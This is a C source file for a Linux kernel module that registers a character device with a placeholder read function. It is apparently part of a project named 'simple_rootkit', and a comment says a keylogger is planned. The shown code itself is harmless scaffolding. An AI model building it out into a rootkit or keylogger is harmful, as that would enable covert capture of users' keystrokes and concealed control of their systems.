#include <linux/fs.h>
#include "fops.h"
#include "simple_rootkit.h"

static ssize_t device_read(struct file *, char *, size_t , loff_t *);

struct file_operations fops = {
    .read = device_read
};

int major;

/* THIS IS ONLY TEMPORARY! AFTER KEYLOGGER IS BUILT, MAKE A PROPER device_read FUNCTION IN THE CORRESPONDING FILE */
char msg[] = "Hello, read is bazinga.\n";
static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset) {
    size_t count = 0;
    if(*offset == 0) {
        while (msg[count] != 0) {
            put_user(msg[count], buffer++);
            count++;
            (*offset)++;
        }
        return count;
    } else {
        return 0;
    }
}

int init_fops(void) {
	printk(KERN_INFO "[+] Module initiated, inside %s.\n", __FUNCTION__);
	major = register_chrdev(0, DEVICE_NAME, &fops);
	printk(KERN_INFO "[+] major: %d\n", major);
	if (major < 0) {
		return major;
	}

	return 0;
}

void exit_fops(void) {
		unregister_chrdev(major, DEVICE_NAME);
		return;
}
